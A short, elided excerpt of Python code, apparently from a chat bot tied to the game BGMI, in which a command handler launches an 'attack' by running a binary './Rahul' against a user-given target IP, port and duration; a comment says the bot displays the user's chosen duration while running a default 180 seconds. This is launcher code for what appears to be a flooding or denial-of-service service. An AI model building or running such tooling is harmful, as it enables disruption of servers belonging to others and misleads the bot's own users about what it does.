...
def bgmi_command(message):
    ...
    try:
        ...
        # Notify that the attack will run for the default duration of 180 seconds, but display the input duration
...
async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./Rahul {target_ip} {target_port} {duration} 677"
